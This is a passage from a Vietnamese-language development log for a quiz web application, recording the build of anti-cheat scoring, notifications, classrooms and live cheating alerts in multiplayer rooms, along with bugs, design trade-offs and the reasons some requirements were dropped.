- **"Khó khăn & cách giải quyết":** ba ví dụ mới — (1) `@EnableScheduling` thiếu thì job im lặng không chạy;
  (2) Hibernate xếp INSERT trước UPDATE làm vỡ ràng buộc duy nhất; (3) `retry` trên request có tác dụng phụ
  tạo dữ liệu trùng — kèm việc nó giải được một flake để ngỏ từ hôm trước.
- **Mục 3.4:** phép kiểm "xoá sạch Redis rồi đọc lại" là ví dụ về **kiểm giả thiết kiến trúc**, không chỉ
  kiểm hàm.
## 📅 T2 — 17/08/2026 (tối) — Lát cắt 12: Chống gian lận, và một yêu cầu tôi quyết định bỏ

**Mục tiêu:** làm nốt tính năng 12 trong 5 tính năng `[S]` còn lại (13 → 15 → **12** → 16 → 14).

**Xong:** V17 (2 bảng) · 4 endpoint · hook thu tín hiệu + 3 màn hình · 20 test backend + 15 test frontend ·
chạy thật 9/9 phép kiểm toàn tuyến trên server đang chạy.

### Một yêu cầu chức năng tôi bỏ, và vì sao đó không phải cắt bớt cho nhanh

FR-44 đòi *phát hiện đáp án trùng bất thường giữa các người chơi trong cùng phòng real-time*. Đọc lại tính năng
04 mới thấy nó **không lưu ai chọn phương án nào ở câu nào** — diễn biến ván nằm trong Redis, xuống PostgreSQL
chỉ còn bảng xếp hạng cuối ván. Muốn đối chiếu thì phải đổi mô hình dữ liệu của một tính năng đã xong.

Đã hỏi lại người hướng dẫn dự án và chọn **phương án 1: bỏ FR-44, ghi rõ lý do**. Lý do không chỉ là chi phí:
trong phòng đấu mọi người làm **cùng một bộ câu 4 phương án**, nên hai người trùng đáp án là chuyện thường —
kể cả trùng ở câu sai, vì phương án gây nhiễu được thiết kế để hấp dẫn. Với phòng 5–10 người, tín hiệu này
sinh báo động sai liên tục. Đổi mô hình dữ liệu của tính năng 04 để lấy một tín hiệu nhiễu là lỗ vốn.

Điều cần rút ra: **khi bỏ một yêu cầu, chỗ ghi lý do phải là đặc tả, không phải commit message.** Người đọc
`docs/features/12-anti-cheat.md` sáu tháng sau sẽ hỏi "sao thiếu FR-44", và câu trả lời phải nằm ngay đó.

### Trọng số tuyến tính làm cờ mất nghĩa

Bản đầu cộng thẳng: mỗi lần mất focus +8 điểm. Thử với một bài thi 60 phút thì hỏng ngay — máy có thông báo,
người thi bị gọi, mất focus mươi lần là bình thường, và bài nào cũng vượt ngưỡng 60. **Khi mọi bài đều bị gắn
cờ thì cờ không còn nói gì cả**, và người rà soát sẽ bỏ qua cả trang.

Sửa thành trọng số giảm dần: 3 lần đầu tính đủ, từ lần thứ 4 nhân 0.3. Ba lần chuyển tab vẫn đáng để ý, lần thứ
mười hai thì không đáng gấp bốn lần thứ ba.

### Hai lớp cho một lời hứa về quyền riêng tư

Màn làm bài nói với người thi: *"hệ thống không đọc nội dung bạn dán"*. Hook client đã chỉ lấy `.length` rồi bỏ
chuỗi đi. Nhưng nếu chỉ có một lớp thì **một bản client bị sửa là đủ** để nội dung chảy vào cơ sở dữ liệu. Nên
server không lưu gói tin của client mà **dựng lại `detail` từ đúng hai trường số** (`length`, `seconds`). Kiểm
lại trên server đang chạy: `detail` của PASTE là `{"length": 400}` — chỉ một con số.

Test frontend cũng kiểm theo cách đó: đưa vào một chuỗi thật rồi khẳng định `JSON.stringify(lô)` **không chứa**
chuỗi đó. Kiểm `length` đúng thì không đủ — nếu ai đó thêm trường `text` vào sau này, `length` vẫn đúng.

### Ba chỗ giao diện cố ý không làm cho "đẹp"

| Chỗ | Làm gì | Vì sao |
|---|---|---|
| Thanh điểm rủi ro | **Cam, không đỏ** | Đỏ đọc thành "đã kết luận có tội", còn trạng thái thật chỉ là "đáng xem" |
| Câu nhắc "không phải bằng chứng" | Đặt **cạnh con số**, không xuống cuối trang | Người đọc phải thấy hai thứ cùng lúc; nhắc sau khi đã kết luận thì vô ích |
| Người thi xem điểm của mình | **404**, không phải 403 | 403 đã là một xác nhận rằng bài đó có báo cáo và đang bị gắn cờ |

`review_status` mặc định PENDING và API **từ chối nhận PENDING như một kết luận** (400): nó là trạng thái ban
đầu của hệ thống, không phải một lựa chọn của người rà soát. Đặc tả ghi *"không tự động phạt"* — chốt bằng mã
chứ không bằng ý định.

### Đo thật

Ba bài thi mẫu với kịch bản khác nhau: dán 1500 ký tự + 3 lần chuyển tab → **98/100**; chuyển tab 4 lần + mất
focus 2 lần → **69/100**; dán 2000 ký tự + thoát toàn màn hình → **66/100**. Cả ba đều vào hàng chờ, sắp theo
rủi ro giảm dần, và Gemini trả nhận định thật cho cả ba. Lượt luyện tập bị từ chối `400`. Người thi bị `404`
cả khi đọc lẫn khi kết luận. Chủ quiz bị `403` ở hàng chờ toàn hệ thống.

### Một câu hỏi làm lộ ra lỗ trong chính thiết kế của mình

Người hướng dẫn dự án hỏi *"ai là người thấy người làm bài gian lận"*. Trả lời xong mới thấy vấn đề: quyền thì
đúng — chủ quiz và Admin — nhưng **chủ quiz không có hàng chờ**. Bảng *Bài làm* ở trang thống kê quiz không có
cột nào cho biết bài nào bị gắn cờ, nên một giáo viên 200 bài nộp phải mở từng bài mới biết. Trên thực tế người
duy nhất phát hiện được là Admin, còn người hiểu hoàn cảnh lớp mình nhất thì không thấy gì.

Đó là mâu thuẫn với chính FR-47 (*"báo cáo cho Creator/Admin"*): **quyền có, nhưng đường đi tới thì không.**
Đã bổ sung `riskScore` + `reviewStatus` vào danh sách bài làm, một cột *Rủi ro* và một dòng cảnh báo đầu trang.

Chỗ đáng ghi lại là **quyết định chỉ gửi điểm của bài vượt ngưỡng**, dưới ngưỡng trả `null`. Không phải để tiết
kiệm băng thông: gắn một con số "mức đáng ngờ" vào *từng* người học là mời người ta xếp hạng học sinh theo độ
nghi — đúng cái tác hại mà cả tính năng này cố tránh. Và điểm 45 không kèm cờ nào thì danh sách lý do rỗng,
người chấm không làm gì được với nó. Quyết định đặt ở **máy chủ** chứ không để giao diện tự lọc, cùng lý do với
404 thay vì 403: một lát nữa có ai thêm một cột vào bảng thì con số không được phép đã nằm sẵn ở đó.

Test của việc này ban đầu **pass rỗng**: nó khẳng định `riskScore == null` cho bài dưới ngưỡng, mà nếu hệ thống
chẳng tính gì cho bài đó thì `null` cũng đúng. Đã thêm một phép kiểm *trước* phép kiểm chính — gọi endpoint báo
cáo và khẳng định bản ghi tồn tại với điểm trong khoảng 1–59. Bài học lặp lại lần thứ ba trong đồ án: **test
khẳng định một thứ vắng mặt thì phải chứng minh trước rằng thứ đó lẽ ra có mặt.**

### Nợ / chuyển sang sau
- **FR-48** (bắt buộc toàn màn hình, khoá chuột phải) — mức `[C]`, hoãn.
- **AI chỉ nhận số đếm theo loại tín hiệu, không nhận chuỗi thời gian.** Cố ý, để prompt không mang dữ liệu
  định danh — nhưng hệ quả là AI không nhận ra mẫu quan trọng nhất: *rời trang rồi 3 giây sau dán một đoạn dài,
  lặp lại đều ở từng câu*. Mắt người xem nhật ký thì thấy. Cải tiến đáng làm nhất của tính năng: gửi khoảng
  cách thời gian giữa các tín hiệu (chỉ số giây, không nội dung).
- Cảnh báo `Alert message` / `Space direction` đã bị antd v6 đánh dấu cũ, hiện ở **27 file** khắp dự án. Sửa là
  một lượt riêng cho cả dự án, không sửa lẻ ở tính năng này để tránh hai quy ước cùng tồn tại.

### Ghi chú báo cáo
- **Mục 2.8 (ERD):** thêm 2 bảng `proctoring_events`, `attempt_integrity`. Nhấn ràng buộc `detail` chỉ chứa số.
- **Mục 2.3 (yêu cầu phi chức năng):** đây là chỗ tốt nhất trong đồ án để nói về **quyền riêng tư** — thu dữ
  liệu hành vi mà vẫn nói rõ thu gì, không thu gì, và không tự kết luận.
- **"Khó khăn & cách giải quyết":** bỏ FR-44 là ví dụ về *đọc lại thiết kế của tính năng khác trước khi hứa*;
  trọng số giảm dần là ví dụ về *ngưỡng cảnh báo phải chịu được dữ liệu thật*.
- **Mục 3.6 (độ chính xác AI):** ba nhận định của Gemini ở trên có thể dùng làm mẫu định tính, nhưng **chưa
  phải số đo** — muốn có tỉ lệ phát hiện đúng/nhầm thì cần bộ bài thi có nhãn, chưa làm.

---

## 📅 T3 — 18/08/2026 — Lát cắt 16: Thông báo, và hai thứ trong đặc tả tôi quyết định không làm

**Mục tiêu:** làm tính năng 16 để danh sách 16 chức năng chỉ còn thiếu tính năng 14 (lớp học). Tính năng này
cũng là hạ tầng mà hai món nợ khác đang chờ: FR-53 (thông báo thành tích) và nút *"Nhắc riêng"* của cảnh báo
live trong phòng đấu.

**Xong:** V18 (2 bảng) · 6 endpoint · job hằng ngày · chuông + 2 trang · 19 test backend + 10 test frontend.

### Cùng một cặp bẫy Spring/JPA, lần thứ hai — và lần này nó vỡ ngay ở test đầu

Chống gửi trùng ban đầu viết theo cách hiển nhiên: `save()` trong `try`, bắt
`DataIntegrityViolationException`. **Bốn test đỏ ngay lượt chạy đầu** với `duplicate key value violates unique
constraint`. Nguyên nhân: `save()` của JPA *chưa gửi câu lệnh xuống cơ sở dữ liệu*, nên vi phạm ràng buộc nổ
lúc commit — **sau khi** thân phương thức đã ra khỏi khối `catch`.

Chữa bằng `saveAndFlush` để ngoại lệ nổ trong `try` thì rơi vào bẫy thứ hai, đúng cái đã gặp ở tính năng 13:
Spring đã đánh dấu transaction là rollback-only nên bắt rồi trả về bình thường vẫn vỡ ở lần commit với
`UnexpectedRollbackException`.

Cách ra: `INSERT ... ON CONFLICT DO NOTHING`. **Không có ngoại lệ nào** để bắt, transaction không bị đánh dấu
gì, và hàm trả về số dòng đã chèn nên vẫn biết được là vừa tạo hay đã có. Điều rút ra rộng hơn cả cái bẫy:
**trùng khoá là đường chạy bình thường của một job hằng ngày, nên nó không nên đi qua cơ chế ngoại lệ ngay từ
đầu.** Lần trước tôi coi đây là mẹo chữa lỗi; lần này thấy nó là quyết định thiết kế.

### Đặc tả gợi ý khoá phân tán Redis, tôi chọn ràng buộc duy nhất

Ghi chú kỹ thuật của tính năng 16 viết *"cân nhắc khóa phân tán (Redis) nếu chạy nhiều instance để không gửi
trùng"*. Khoá phân tán chỉ chặn **hai instance cùng lúc**. Còn `UNIQUE (user_id, dedupe_key)` chặn *mọi* đường
dẫn tới việc gửi trùng: hai instance cùng lúc, deploy lại giữa trưa, ai đó gọi tay để thử, hay tính lại XP làm
phát lại sự kiện. Và nó không thêm một thành phần nữa có thể chết.

Cái giá là job có thể chạy trùng và làm việc vô ích một lát — với vài trăm người dùng thì đó là một câu
`group by` chạy hai lần. Đổi lấy một bảo đảm mạnh hơn thì rẻ.

### Hai thứ trong đặc tả tôi không làm

| Bỏ / hoãn | Vì sao |
|---|---|
| **FR-69 email** (hoãn) | Cần SMTP thật + khoá trong `.env`, cả hai không có trong tech-stack. Và không kiểm chứng được: email vào hộp thư rác là chuyện thường với người gửi mới, nên "gửi thành công" ở phía mình không nói gì về việc thư có tới |
| **Khung giờ nhắc — quiet hours** (bỏ) | Một cột **sẽ không làm gì cả**. Job chạy đúng một lần mỗi ngày lúc 7:00, nên khung im lặng 22:00–07:00 không chặn được gì. Thông báo in-app cũng không đánh thức ai — quiet hours chỉ có nghĩa với đẩy về điện thoại hoặc email, mà email đã hoãn. Nó còn cần **múi giờ người dùng**, thứ hệ thống không lưu |

Đây là lần thứ ba trong đồ án gặp cùng một dạng quyết định (sau FR-84 hạn mức AI và FR-48): **thêm một ô nhập
hoặc một cột mà không có gì đọc nó thì tệ hơn là không có** — nó trông như một tính năng và cư xử như không có.

### Một cái bẫy Jackson chỉ vỡ ở chỗ không ai thấy

DTO thông báo đi **hai chiều**: ra REST/STOMP, và *vào lại* khi listener đọc gói tin từ Redis. Cột `data` là
`jsonb` trong CSDL nhưng `String` trong Java, nên phải có `@JsonRawValue` để client nhận một *đối tượng* thay vì
một chuỗi bị escape.

`@JsonRawValue` chỉ tác dụng khi **ghi**. Thiếu deserializer cho chiều đọc thì Jackson gặp một đối tượng JSON ở
chỗ chờ `String` và ném lỗi — mà chỗ ném là **trong listener Redis**. Hậu quả: thông báo real-time lặng lẽ
không tới ai, người dùng chỉ thấy nó ở lần tải trang sau, và **không có lỗi nào ở đường request để lần ra**.
Đây là loại lỗi không thể bắt bằng cách thử tay, nên có `NotificationResponseJsonTest` riêng cho vòng ra-vào của
một record ba dòng.

### Test frontend bắt được hai lỗi thật

1. **Chuông gọi API danh sách khi hộp còn đóng.** Tôi định "chỉ gọi khi mở" bằng cách đổi tham số
   (`moHop ? {size:8} : {}`) — nhưng đổi tham số vẫn là một request. Phải thêm `enabled` thật vào hook. Chuông
   hiện ở *mọi* trang, nên đây là 8 thông báo kéo về mỗi lần tải trang chỉ để vẽ một chấm đỏ.
2. **`mutationFn: notificationApi.danhDauDaDoc` truyền thẳng.** TanStack Query gọi `mutationFn(variables,
   context)`, nên hàm API nhận thêm một object context ở tham số thứ hai. Hôm nay vô hại vì hàm chỉ đọc tham số
   đầu — nhưng ngày nào đó nó có tham số thứ hai tuỳ chọn thì context của TanStack lặng lẽ chảy vào đúng chỗ đó.
   Đã bọc trong arrow ở mọi mutation.

Cả hai đều là lỗi *thật* chứ không phải test viết sai — và cả hai đều thuộc loại không bao giờ lộ ra khi thử tay.

### Trả nốt FR-53

Tính năng 13 để lại FR-53 với ghi chú *"cần tính năng 16"*. Nay trả bằng hai sự kiện miền `LevelUpEvent` /
`BadgeEarnedEvent` phát từ `GamificationService.award` — cửa duy nhất mà XP đi qua. `GamificationService` không
cần biết tính năng 16 tồn tại, và bỏ hẳn tính năng 16 cũng không phải sửa một dòng nào ở đó.

Riêng phần *hiệu ứng* của FR-53 (confetti khi lên cấp) thì không làm: một hiệu ứng bật lên giữa lúc người học
đang làm bài là thứ gây phân tán, còn ở trang Thành tích thì huy hiệu đã hiện sẵn. Cùng lý do với việc **không
hiện toast** khi có thông báo mới — chuông đã có chấm đỏ.

### Gộp ba nhánh song song, và chỗ duy nhất thật sự đáng lo

Ba tính năng 15, 12, 16 làm trên ba nhánh tách ra từ cùng một điểm, nên khi merge nhánh 15 vào `main` thì hai
nhánh kia báo xung đột. Bốn trong năm chỗ là **"hai bên cùng thêm"** — hai dòng bảng theo dõi, hai mục nhật ký,
hai dòng README, hai import và hai route ở `App.tsx`. Loại này chỉ cần giữ cả hai, xếp đúng thứ tự.

Chỗ thứ năm mới đáng đọc kỹ: cả nhánh 15 và nhánh 16 đều **sửa cùng một hàm** `GamificationService.award` —
nhánh 15 thêm `leaderboardService.congDiem(...)`, nhánh 16 thêm hai lời `publishEvent(...)`. Git không thể tự
biết nên giữ cái nào, và **chọn một bên là mất lặng lẽ nửa tính năng kia**: giữ bên 15 thì không còn thông báo
thành tích, giữ bên 16 thì điểm mùa không bao giờ được cộng — và cả hai đều *biên dịch được*, cả hai đều không
có test nào đỏ ở nhánh còn lại vì nhánh đó không có mặt.

Điều rút ra: **xung đột nguy hiểm không phải chỗ hai bên viết đè lên nhau, mà chỗ hai bên cùng thêm việc vào
một hàm.** Chỗ đè lên nhau thì Git bắt phải đọc; chỗ cùng thêm thì rất dễ "chọn bên mình" cho nhanh.

Sau khi gộp, `award` làm đủ ba việc theo thứ tự có nghĩa: đồng bộ điểm mùa → trao huy hiệu → phát sự kiện
(phải sau cùng vì nó cần biết huy hiệu vừa trao và cấp mới). Chạy lại toàn bộ test để chắc.

### Một flake thứ ba của test chat — đã sửa, ở mục dưới

Chạy toàn bộ suite sau khi gộp thì `ChatIntegrationTest` đỏ với `WebClientRequestException: empty headers are
not allowed []`. Đã xác định **không phải hồi quy do gộp**: mã nguồn chat và file test ở nhánh này giống hệt
`main` từng dòng, và chạy riêng lớp đó hai lượt thì lượt 1 xanh, lượt 2 đỏ ở một *test method khác*
(`shouldRespectUnsharing` thay vì `shouldStreamMetaBeforeTokens`). Đổi chỗ đỏ mỗi lượt = không xác định.

Đây là flake **thứ ba**, khác hai cái đã sửa ở lát cắt 15 (kết nối chết trong pool, và `.retry(1)` nhân đôi
phiên). Bản sửa hôm đó — bỏ pool bằng `ConnectionProvider.newConnection()` — vẫn còn nguyên và vẫn đúng, nhưng
chưa đủ. Chưa truy ra nguyên nhân nên **không sửa vội**: cái sai lớn hơn là thêm một `retry` để nó hết đỏ, vì
đó đúng là thứ đã tạo ra flake số hai.

Ghi lại đây làm nợ. Một suite đỏ ngẫu nhiên là vấn đề thật với đồ án — lúc bảo vệ mà `mvn test` đỏ thì không
kịp giải thích rằng nó chỉ chập chờn.

### Sửa flake chat: lần thứ tư thì bỏ hẳn thư viện thay vì vá tiếp

Truy được nguyên nhân **gần**: `IllegalArgumentException: empty headers are not allowed` ném từ
`HttpObjectDecoder.readHeaders` của Netty — tức **bộ giải mã phản hồi ở phía client** đọc phải một dòng có tên
header rỗng, nghĩa là nó mất đồng bộ với dòng byte. Không phải lỗi ở server: trình duyệt đọc đúng luồng này
bằng `EventSource` vẫn chạy bình thường.

Nguyên nhân **sâu** bên trong Netty thì **không truy được**, và tôi ghi rõ điều đó thay vì đoán. Bật `wiretap`
để xem byte thật thì *không tái hiện được nữa* — thêm một handler vào pipeline là đủ đổi nhịp và che mất tình
huống. Chạy bốn lượt có wiretap đều xanh.

Nhìn lại thì chỗ này đã sửa **ba lần**, mỗi lần đổi một lỗi lấy một lỗi khác:

| Lần | Làm gì | Hỏng ra sao |
|---|---|---|
| 1 | `WebClient.create()` — pool dùng chung | Pool giữ kết nối server đã đóng → `Connection prematurely closed` |
| 2 | Thêm `.retry(1)` | **Tệ hơn**: gửi lại một request *có tác dụng phụ* → phiên chat nhân đôi |
| 3 | `ConnectionProvider.newConnection()` | Hết hai lỗi trên, còn lỗi thứ ba trong bộ giải mã của Netty |

Lần thứ tư không vá nữa mà **bỏ hẳn thành phần hay vỡ**: dùng `java.net.http.HttpClient` của JDK. Test này
không cần gì của WebClient — nó chỉ cần POST một request rồi đọc toàn bộ phản hồi. JDK client làm đúng ngần đó
bằng bộ giải mã HTTP của chính JDK, **không có tầng reactive, không có pool để bốc nhầm, không có cơ chế thử
lại ẩn**. Ba nguồn lỗi của ba lần trước biến mất cùng lúc vì thành phần sinh ra chúng không còn nữa.

Điều rút ra: **vá lần thứ ba trên cùng một chỗ là tín hiệu chọn sai công cụ, không phải chọn sai tham số.**
Mỗi bản vá trước đều đúng về mặt lý luận và đều thật sự sửa được lỗi nó nhắm tới — nhưng cứ mỗi lần lại lộ ra
một tầng phức tạp mới của thư viện mà test không hề cần tới.

Đo: chạy riêng lớp đó **6 lượt liên tiếp đều xanh**, rồi chạy toàn bộ suite. Trước đó tỉ lệ đỏ khoảng 1 trên 3
lượt, nên 6 lượt sạch là bằng chứng khá tốt — nhưng **chưa phải chứng minh**, và tôi ghi vậy chứ không tuyên bố
đã hết hẳn.

### Nợ / chuyển sang sau
- (đã làm nốt tính năng 14 trong cùng ngày — xem mục dưới)
- **Cảnh báo live trong phòng đấu** — giờ đã có hạ tầng gửi thông báo tới một người, nên nút *"Nhắc riêng"* làm
  được. Vẫn cần kênh STOMP riêng cho host trước (xem [features/12](../features/12-anti-cheat.md)).
- `ASSIGNMENT_DUE` và `ROOM_INVITE` khai sẵn trong ràng buộc `CHECK` nhưng **chưa có nguồn phát**; cố ý không
  đưa lên trang cài đặt để không có công tắc rỗng.

### Ghi chú báo cáo
- **Mục 2.8 (ERD):** thêm 2 bảng. Nhấn `dedupe_key` — chọn ràng buộc duy nhất thay vì khoá phân tán Redis, và
  vì sao lựa chọn đó *mạnh hơn* chứ không chỉ đơn giản hơn.
- **Mục 2.7:** tính năng này là ví dụ thứ hai về **domain event** (sau gamification), và là ví dụ tốt về
  **dùng lại hạ tầng**: real-time đi đúng đường Redis→STOMP mà phòng đấu đã mở, chung một
  `RedisMessageListenerContainer`.
- **"Khó khăn & cách giải quyết":** cặp bẫy JPA gặp lần thứ hai (và lần này rút ra được nguyên tắc rộng hơn),
  cùng cái bẫy `@JsonRawValue` một chiều.
- **Mục 3.4:** hai lỗi thật do test frontend bắt được — cả hai đều không lộ ra khi thử tay. Đây là lập luận
  cụ thể cho việc viết test giao diện, không chỉ test backend.

---

## 📅 T3 — 18/08/2026 (chiều) — Lát cắt 14: Lớp học, và đủ 16/16 chức năng

**Mục tiêu:** làm nốt mục cuối cùng trong danh sách 16 chức năng của `docs/features/`.

**Xong:** V19 (3 bảng + 1 cột) · 15 endpoint · 4 trang · 24 test backend + 8 test đơn vị · chạy thật 20/20
phép kiểm toàn tuyến. Cùng ngày còn hai việc nhỏ: chặn quản trị viên khỏi khu học tập, và sửa dứt điểm flake
của test chat.

### Lớp học khác phòng đấu ở chỗ nào — câu hỏi đáng trả lời trước khi code

Người hướng dẫn dự án hỏi *"chức năng lớp học khác gì với phòng đấu"*. Trả lời được câu đó mới thấy rõ nên
làm gì: **phòng đấu là một SỰ KIỆN, lớp học là một QUAN HỆ.**

| | Phòng đấu (04) | Lớp học (14) |
|---|---|---|
| Thời gian | Đồng bộ — cùng lúc, cùng câu, chung đồng hồ | Bất đồng bộ — mỗi người làm lúc nào cũng được |
| Nhóm người | Tạm, tan khi hết ván | Bền, có vai trò |
| Danh tính | Khách vãng lai vào được | Bắt buộc tài khoản |
| Tính điểm | Theo tốc độ + độ chính xác | Chỉ theo đáp án đúng |
| Công nghệ | WebSocket + Redis Pub/Sub | **REST thuần, không real-time** |

Dòng cuối là điều quan trọng nhất: lớp học **không dùng một dòng nào** của hạ tầng real-time. Nó không phải
"phòng đấu bản chậm" mà là một trục khác hẳn. Và nó cũng không dựng cơ chế làm bài mới — học sinh làm bài tập
bằng đúng luồng `quiz_attempts` của lát cắt 3, còn bảng theo dõi lớp là truy vấn của lát cắt 9 thêm một bộ lọc.
Phần thật sự mới chỉ là *"ai thuộc lớp nào"* và *"bài nào giao cho lớp nào"*.

### Quiz PRIVATE — chỗ mà nếu bỏ sót thì cả tính năng vô dụng

Giáo viên gần như luôn để quiz ở chế độ PRIVATE, mà `AttemptService.start` chặn quiz PRIVATE của người khác.
Nếu chỉ thêm một tham số `assignmentId` vào endpoint làm bài cũ thì học sinh vẫn nhận 404 — tính năng chạy
được trên quiz mẫu PUBLIC và hỏng với mọi quiz thật.

Cách xử lý: **một endpoint bắt đầu riêng** `POST /assignments/{id}/attempts`. Nó bỏ qua kiểm `visibility` vì
quyền đã được xác nhận ở tầng trên — người gọi là thành viên của lớp được giao bài đó. Nới `start` để nó tự
biết về lớp học thì hai tính năng lẽ ra độc lập dính vào nhau, và tầng làm bài phải mang theo kiến thức không
thuộc về nó. Có test riêng cho đúng tình huống này: *tự vào làm thì 404, được giao thì làm được*.

### Ba thứ chạy sẵn nhờ những lát cắt trước

Điều dễ chịu nhất của lát cắt này là **bao nhiêu thứ không phải viết**:

| Có sẵn | Nhờ đâu |
|---|---|
| Chống gian lận cho bài tập | Lượt bài tập luôn là `EXAM`, nên [features/12](../features/12-anti-cheat.md) thu tín hiệu mà không cần cấu hình gì |
| Nhắc hạn nộp | [features/16](../features/16-notifications.md) đã có hạ tầng; loại `ASSIGNMENT_DUE` cũng đã khai sẵn trong `CHECK` của V18 nên **không cần migration** để thêm |
| Chấm điểm, thống kê | Luồng `quiz_attempts` của lát cắt 3 và 9 |

Loại `ASSIGNMENT_DUE` là ví dụ rõ nhất: hôm trước khai sẵn giá trị nhưng **cố ý không đưa lên trang cài đặt**
vì chưa có ai gửi. Hôm nay có nguồn phát thì chỉ cần đổi một hàm `daCoNguonPhat()` — và công tắc tự xuất hiện.
Đó đúng là hình dạng mong muốn của một chỗ nối để dành.

### Cái bẫy về thời gian, và test bắt được nó

Trạng thái *nộp muộn* tính bằng cách so **thời điểm nộp** với hạn — không phải so `now` với hạn. Viết theo cách
thứ hai thì test ngay sau khi nộp vẫn xanh, nhưng một tuần sau giáo viên mở bảng ra xem thì **cả lớp bỗng thành
nộp muộn** và điểm bị trừ oan. Đã có một test riêng đúng cho tình huống *"nộp đúng hạn, xem sau một tuần"*.

Cùng nhóm: `dueAt` để trống là hợp lệ (giáo viên không muốn đặt hạn). Coi `null` là "hạn đã qua" thì mọi bài
không hạn đều đỏ lòm *quá hạn* ngay từ lúc giao. Cũng có test.

### Quá hạn vẫn cho nộp

Đây là quyết định về con người hơn là về kỹ thuật. Khoá cứng lúc hết hạn thì một em mất mạng mười phút là mất
trắng bài, và giáo viên không còn cách nào biết em ấy có làm hay không. Nên: vẫn nhận bài, đánh dấu rõ là nộp
muộn, và để giáo viên quyết định trừ điểm hay không — **cùng nguyên tắc với chống gian lận: hệ thống đưa dữ
kiện, người thật quyết định.**

### Đo thật

Chạy toàn tuyến trên server đang chạy, 20/20: tạo lớp → mã `SWTCKA` (không có 0/O/1/I/L) → hai học sinh vào
bằng mã → vào lại lần hai không sinh dòng thừa → mã lớp trả `null` cho học sinh nhưng có với giáo viên →
người ngoài lớp nhận 404 → **quiz PRIVATE: tự vào làm bị 404, được giao thì làm được** → nộp 3/3 điểm → nộp
rồi thì không làm lại được → bảng theo dõi có dòng cho em chưa làm với `diem = null` → trợ giảng xem được
thành viên nhưng bị 403 khi xoá lớp → lượt bài tập ở chế độ `EXAM`.

### Đủ 16/16

| Nhóm | Trạng thái |
|---|---|
| 01–09 (`[M]` + thống kê) | ✅ |
| 10–16 (`[S]`) | ✅ |

Còn lại là những mục `[C]` đã hoãn **có lý do ghi trong đặc tả**: FR-48 (thi nghiêm ngặt), FR-58 (xuất bảng
điểm), FR-69 (email), FR-84 (hạn mức AI), quiet hours. Và hai mục **bỏ hẳn** có lý do: FR-44 (đối chiếu đáp án
trong phòng đấu) và cảnh báo live trong phòng đấu — cái sau đã chốt thiết kế, chỉ chưa làm.

### Ghi chú báo cáo
- **Mục 2.8 (ERD):** thêm 3 bảng + 1 cột. Nhấn `ON DELETE RESTRICT` của `assignments.quiz_id` — khoá ngoại
  **duy nhất** trong lược đồ dùng RESTRICT, và lý do là mất dữ liệu trong im lặng.
- **Mục 2.2 (phân tích yêu cầu):** lớp học là chỗ tốt nhất để nói *ai dùng hệ thống và dùng thế nào* — ba trụ
  cột kia là điểm kỹ thuật, cái này là điểm bối cảnh sử dụng.
- **"Khó khăn & cách giải quyết":** bẫy quiz PRIVATE (nếu bỏ sót thì tính năng chạy được trên dữ liệu mẫu và
  hỏng với dữ liệu thật), và bẫy so `now` thay vì so `submittedAt`.
- **Mục 3.4:** lát cắt này là ví dụ tốt về **test đơn vị cho phần có nhánh logic** (8 ca cho hàm tính trạng
  thái) tách khỏi **test tích hợp cho phần phân quyền** (16 ca) — hai loại câu hỏi khác nhau, hai loại test
  khác nhau.

---

## 📅 T4 — 19/08/2026 — Cảnh báo gian lận trực tiếp trong phòng đấu

**Mục tiêu:** làm mục còn hoãn có giá trị nhất — phần chống gian lận (features/12) trước nay **chỉ áp cho bài
thi cá nhân**, phòng đấu real-time không có một tín hiệu nào. Thiết kế đã chốt từ lát cắt 12, hoãn tới sau
tính năng 16 vì cần hạ tầng gửi riêng cho một người.

**Xong:** V20 (1 bảng) · 2 kênh STOMP + 1 endpoint REST · 2 loại sự kiện mới · 1 hook + 2 component frontend ·
9 test đơn vị + 6 test tích hợp + 15 test frontend. Backend 437 → 454, frontend 45 → 60.
Dọc đường phát hiện **một test có sẵn trên `main` đang đỏ** và nó đỏ vì tiền đề sai — sửa luôn.

---

### Một câu trong thiết kế đã chốt KHÔNG thực hiện được — phát hiện trước khi viết dòng code nào

Bản chốt ở `features/12` ghi: *"Sau ván: kết luận và xử lý điểm ở màn báo cáo, **dùng lại cơ chế
`PENDING → VALID/INVALID` kèm ghi chú đã có**"*.

Đọc lại schema thì câu đó sai ở **cả hai đầu**:

| Ràng buộc của `V17__anti_cheat.sql` | Thực tế phòng đấu |
|---|---|
| `proctoring_events.attempt_id NOT NULL` → `quiz_attempts` | Phòng đấu **không tạo một dòng `quiz_attempts` nào** — 0 lần dùng `QuizAttempt` trong `RoomService`; điểm nằm ở `game_room_players` |
| `proctoring_events.user_id NOT NULL` → `users` | **Khách vãng lai không có dòng `users`** — và đó chính là nhóm người phòng đấu tồn tại để phục vụ |

Nếu cứ lao vào code thì sẽ phát hiện lúc đã viết xong nửa tính năng, và lối ra dễ nhất lúc đó là **nhồi một
`attempt_id` giả** để lách ràng buộc. Làm vậy thì mọi truy vấn thống kê theo lượt thi về sau sẽ đếm cả những
dòng không thuộc lượt thi nào — một lỗi âm thầm, không bao giờ báo.

Không sửa migration đã commit (CLAUDE.md cấm). Cách làm: **bảng riêng** `room_proctoring_events`, khoá theo
`player_id` phạm vi phòng nên khách và thành viên dùng chung một đường.

Và bảng đó **cố ý không có** `risk_score` lẫn `review_status`. Hai cột ấy chỉ có nghĩa khi có người quay lại
kết luận; ván xong là phòng tan, không ai quay lại. Đây là lần thứ hai dự án gặp *"một cột sẽ không làm gì
cả"* — lần đầu là ô nhập hạn mức AI ở FR-84, và câu trả lời vẫn thế: không thêm.

### Ngưỡng của bài thi đưa nguyên sang phòng đấu là sai

Bài thi cá nhân gắn cờ khi *"chuyển tab 3 lần"*. Phòng đấu nhiễu hơn hẳn: phần lớn người chơi vào bằng điện
thoại sau khi quét QR, và **một tin nhắn đến là một `visibilitychange`**. Phòng 10 người × 10 câu thì gần như
chắc chắn có người đạt 3 lần mà không làm gì sai — và khi mọi người đều bị gắn cờ thì cái cờ mất nghĩa.

Nên cờ ở đây đếm **khuôn lặp**: *rời trang rồi quay lại trong lúc câu hỏi còn sống, lặp ở nhiều câu khác nhau*
(ngưỡng 2 câu). Bốn lần rời-về trong **cùng một câu** vẫn không gắn cờ.

**Khuôn này tự loại được trường hợp vô hại, và đó là điểm hay nhất của nó.** Server đóng số câu *đang mở* vào
mỗi tín hiệu. Người bị gián đoạn thật — nghe một cuộc gọi 30 giây — lúc quay lại thì ván đã sang câu sau, và
WebSocket vẫn mở nên client đã nhận câu mới trong lúc ẩn: tín hiệu quay lại của họ mang **số câu khác**, câu bị
